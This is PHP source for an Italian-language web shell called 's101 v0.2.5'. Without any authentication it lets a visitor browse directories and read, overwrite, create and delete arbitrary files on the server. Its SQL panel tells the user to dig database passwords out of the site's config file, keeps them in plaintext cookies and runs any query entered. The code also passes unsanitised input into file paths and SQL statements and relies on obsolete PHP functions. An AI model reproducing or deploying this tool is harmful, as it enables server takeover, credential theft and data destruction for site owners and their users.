<?php
error_reporting(0);
echo "
<html>
<head>
<title>s101 v0.2.5</title>

<STYLE type='text/css'>
body{
    background-color: #57A2C1;
    scrollbar-face-color : 0000FF ;
    scrollbar-track-color : 57A2C1 ;
    scrollbar-highlight-color : 319585 ;
    scrollbar-3dlight-color : 5174A3 ;
    scrollbar-shadow-color : 224535 ;
    scrollbar-arrow-color : 319585 ;
    scrollbar-darkshadow-color : 319585 ;
}

div{
    border-style:double;
}

div.record{
    border-style:solid;
    width:120px
}

input.text{
    background-color: #57A2C1;
    border: 0;
}

textarea{
    border: 0;
    background-image: url(immagine.png);
    background-attachment: inherit;
    background-repeat: no-repeat;
}
}

textarea:hover{
    background-color: #83AEC9;
    border: 0;
}

div.modifok {
    background-color: #99CCFF;
    border: medium double rgb(0,0,0);
}

div.modifno {
    background-color: #FF0000;
    border: medium double rgb(0,0,0);
}
</STYLE>

<script type='text/javascript'>

var opac;
opac = 0;

function modifok(){
if(opac < 1){
mess.style.opacity = opac;
opac += 0.01;
setTimeout('modifok()', 30);
}
}

function contlet(){
var testo = document.leggi.contenuto.value;
var len = testo.length;
pesocont.innerHTML = 'Peso attuale:' + len + 'Kb';
}

function indietro(){
history.go(-1);
}
</script>

</head>
";

$dir=$_GET["dir"];
if($dir != ""){
$dir=$dir;
}else{
$dir=".";
}
$se= $_SERVER['PHP_SELF'];

switch($azione){
case "leggi":
     $mod = $_GET["mod"];
     $file = $_GET["file"];
	 
	 if($mod == "1"){
	 $file = $file;
         echo "<body onload='modifok()'>";
         echo "<div id='mess' class='modifok' align='center'>File Modificato con successo</div>";
	 }else{
         echo "<body>";
	 $file = $dir . "/" . $file; 
	 }
	 $peso= filesize($file);
         $f = fopen($file, 'r');
	 $contenuto = fread($f , filesize($file));
	 $contenuto = htmlspecialchars($contenuto);
	 

         $im = imagecreatetruecolor(1000,7000); 
         $bg = imagecolorallocate($im,87,162,193); 
         $rec = imagecolorallocate($im,87,162,193); 
         $col = imagecolorallocate($im,0,0,0);
         $bg2 = imagecolorallocate($im,87,162,193);
         imagefill($im,0,0,$bg); 
         imagerectangle($im,10,10,190,190,$rec); 
         imagefill($im,11,11,$bg2);

         $li = 1;
         $y = 2;
         while($li <= 1000){
         imagestring($im,2,900,$y,"$li",$col);
         $li++;
         $y += 16;
         }
         imagepng($im,"immagine.png"); 


     
	 echo "<div align='center'>
	 <form action='$se?dir=$dir&azione=edita&file=$file' name='leggi' method='post'>
	 Stai Modificando il file:$file <br />
	 <div id='pesocont'>Peso del file: $peso Kb </div><br />
	 <textarea rows='20' cols='120' name='contenuto' onkeyup='contlet()' id='contenuto' bgproperties='fixed'>$contenuto</textarea>
	 <br />
	 <input type='submit' value='Modifica'>
	 </form>
	 <a href='$se?dir=$dir'>Torna indietro</a>
	 $sestesso
	 </div>
	 ";
	 imagedestroy($im);
break;

case "crea":
     echo "<div align='center'>
	 Crea un file in questa directory: $dir
	 <form action='$se?dir=$dir&azione=make' method='post'>
	 Nome(ed estensione):<input type='text' name='nome'><br />
	 <textarea rows='20' cols='120' name='contenuto'></textarea>
	 <br />
	 <input type='submit' value='Crea'>
	 </form>
	 </div>
	 ";
break;

case "make":
     $nuovocont = stripslashes($_POST['contenuto']);
     $file = $_POST["nome"];
	 
	 if($dir == "."){
	     $file = $file;
	 }else{
	     $file = $dir . "/" . $file; 
	 }
     if(!file_exists($file)){ 
          $f = fopen($file, 'a');
          fwrite($f, $nuovocont);
          fclose($f);
          $location= "$se?dir=$dir";
          header("Location: $location");
     }else{
          echo "il file esiste gia. Cambia nome!<script>setTimeout('indietro()', 3000);</script>";
     }
break;


case "edita":
     $nuovocont = stripslashes($_POST['contenuto']);
     $file = $_GET["file"];
     $f = fopen($file, 'w+');
	 fwrite($f, $nuovocont);
	 fclose($f);
	 $location= "$se?dir=$dir&azione=leggi&file=$file&mod=1";
	 header("Location: $location");
	 echo "fatto";
break;

case "cartella":
     $cartella = $_POST['nome'];
	 $cartella = $dir . "/" . $cartella;
     mkdir($cartella);
	 $location= "$se?dir=$dir";
	 header("Location: $location");
break;

case "cancella":
     if(file_exists($file)){
	 unlink($file);
	 $location= "$se?dir=$dir";
	 header("Location: $location");
	 }else{
	 echo "Il file non esite";
	 }
break;

//-----------------------------------------------------------------------------------------------------------SQL

case "sql":

$in=$_GET["in"];
$sezione=$_GET["sez"];

if(isset($host)){
$hostname=$HTTP_COOKIE_VARS["host"];
$user=$HTTP_COOKIE_VARS["user"];
$pass=$HTTP_COOKIE_VARS["pass"];
$dbase=$HTTP_COOKIE_VARS["dbase"];
$connection = mysql_connect("$hostname" , "$user" , "$pass"); 
$db = mysql_select_db($dbase , $connection);
}


switch($sezione){
case "logga":
$hostname=$_POST["host"];
$user=$_POST["user"];
$pass=$_POST["pass"];
$dbase=$_POST["dbase"];
setcookie ("host",$hostname,time()+2592000,"/");
setcookie ("user",$user,time()+2592000,"/");
setcookie ("pass",$pass,time()+2592000,"/");
setcookie ("dbase",$dbase,time()+2592000,"/");
$location= "$se?azione=sql&in=si&sez=home";
header("Location: $location");
break;

case "home":
echo "<div style='border-style:double' align='center'>";
echo "Elenco tabelle presenti nel DataBase<br>";
$q="show tables";
$result= mysql_query($q, $connection) or die ("Errore: " . mysql_error());
while ($rows = mysql_fetch_array($result)) {
  echo "<a href='$se?azione=sql&in=si&sez=tabella&tab=" . $rows[0] . "'>" . $rows[0] . "</a><br>"; 
} 
echo "</div>";
break;

case "tabella":
$tab = $_GET["tab"];
$nomecheck = "0";
echo "<div style='border-style:double' align='center'>";
echo "Elenco campi presenti nella Tabella:<b> $tab</b> <br>";
$q="Show columns from $tab";
$result= mysql_query($q, $connection) or die ("Errore: " . mysql_error());

echo "<form action='$se?azione=sql&in=si&sez=campo' method='post'>";
while ($rows = mysql_fetch_array($result)) 
{
  $nomecheck++;
  echo "<input type='checkbox' name=campo[] value='". $rows[0] . "'>". $rows[0] . "<br>";
} 
echo "<input type='hidden' name='tab' value='$tab'>";
echo "<input type='submit' value='Vedi'>";
echo "</form>";
echo "</div>";
break;

case "campo":
echo "<div style='border-style:double;' align='center'>";
echo "Elenco tabelle presenti nel DataBase<br>";
$tab = $_POST["tab"];
$campo = $_POST["campo"];
echo "<div style=display:block;' align='center'>";
foreach($campo as $value){
    echo "<div style=display:table-cell;' class='record' align='center'>";
    echo "<div style=display:table-row;' class='record' align='center'>$value</div>";
    $q="select $value from $tab";
    $result= mysql_query($q, $connection) or die ("Errore: " . mysql_error());
    while ($row = mysql_fetch_array($result)) {
       $valore = $row["$value"];
       echo "<div style=display:table-row;border-style:double;' width='200'>";
       echo "$valore <br>";
       echo "</div>";//
        
    }
    echo "</div>";//kiude row
}
echo "</div>";//kiude block
echo "</div>";//kiude tutto
break;

case "esegui":
$query=$_POST["query"];
$q="$query";
mysql_query($q, $connection) or die ("<b>Attenzione!</b> La query: \"$query\" non ? stata eseguita per il seguente errore:<br> " . mysql_error());
echo "<div align='center'>query eseguita con successo</div>";
break;

case "slogga":
setcookie("host");
$location= "$se?azione=sql";
header("Location: $location");
break;

default:
echo "<div style='border-style:double' align='center' >
     Pannello di controllo SQL v 0.1<br>
     Da qui puoi gestire il database sql senza molti problemi.<br>
     L'host ? quasi sempre localhost ma controlla il cofing.<br>
     Per ottenre l'username e la password trova il file config.php o simile che contiene le password.<br>
     in Altervista il database ? \"my_nomeuser\" per tutti gli altri host il database lo torvi nel config.<br>
    <form action='$se?azione=sql&sez=logga' method='post'>
    Host:<input type='text' name='host'><br>
    Username:<input type='text' name='user'><br>
    Password:<input type='text' name='pass'><br>
    Database<input type='text' name='dbase'><br>
    <input type='submit' value='Logga'>
    </form>
</div>

";
break;
}

$in=$_GET["in"];
if($in == "si"){
echo"
<div align='center'>
<form action='$se?azione=sql&in=si&sez=esegui' method='post'>
<textarea rows='8' cols='30'></textarea><br>
<input type='submit' value='Esegui'>
</form>
</div>
";
echo "<div align='center'><a href='$se'>Home</a> <a href='$se?azione=sql&sez=sloggati'>Logout</a></div>";
}

break;
//-----------------------------------------------------------------------------------------------------FINE SQL





default :
echo "<div align='center'>s101 Interamente creata da Sora101.<br>Siete liberi di modificarla ma vi prego di tenere i crediti.</div>";
echo "<div align='center' style='border-style:double'>";
echo "<a href='?dir=$dir&azione=crea'>Crea un nuovo file</a><br>";
echo "<a href='?azione=sql'>Pannello SQL</a><br>";
echo "
<form action='$se?dir=$dir&azione=cartella' method='post'>
Crea cartella:<input type='text' name='nome'>
<input type='submit' value='Crea'>
</form>
";
echo "</div>";
echo "<br>";


$col = 0;
echo "<div style='display:block;border-style:double' align='center'>";
echo "<div style='width:130;display:table-cell'>";
if ($handle = opendir("$dir")) {
     while (($file = readdir($handle)) !== false) {
	     $check= ".";
	     $cartelcheck = strpos($file, $check);
		 
		 if($col < 10){
		     if($file == "." || $file == ".."){continue;}
		     echo "<div style='display:table-row;'>";
			 
		     if($cartelcheck === FALSE){
	             echo "<a href='?dir=$dir/$file'>$file</a><br />";
		     }else{
		         echo "<a href='?dir=$dir&azione=leggi&file=$file'>$file</a><a href='$se?dir=$dir&azione=cancella&file=$dir/$file'><img src='http://iconlet.com/icons/eclipse/project/obj16/delete_obj.gif'></a><br />";
		     }
			 
			 echo "</div>";
			 $col++;
		 }else{
		     echo "</div>";
		     echo "<div style='width:130;display:table-cell;'>";
			 $col = 0;
		 }
     }
echo "</div>";	 
closedir($handle); 	 
}
echo "<div align='center'><br /><a href='javascript:history.go(-1)'>Torna indietro</a></div></div>";
break;
}

echo "</html>";
?>